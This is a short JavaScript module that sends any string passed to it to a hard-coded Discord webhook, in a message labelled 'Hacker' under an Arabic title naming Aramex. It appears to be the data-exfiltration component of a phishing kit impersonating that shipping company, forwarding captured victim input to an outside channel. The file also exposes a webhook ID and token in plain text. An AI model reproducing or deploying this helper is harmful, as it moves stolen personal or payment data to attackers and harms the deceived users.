import axios from 'axios';


const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "مدونة ارامكس",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discordapp.com/api/webhooks/1220950132426674237/TDiKwJiv6Mi1Vc9gvQdb6EYR-T2xO0OqeTGD5001U4CpwNg8UP6vu3D0eyxHPBzza1Kh",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;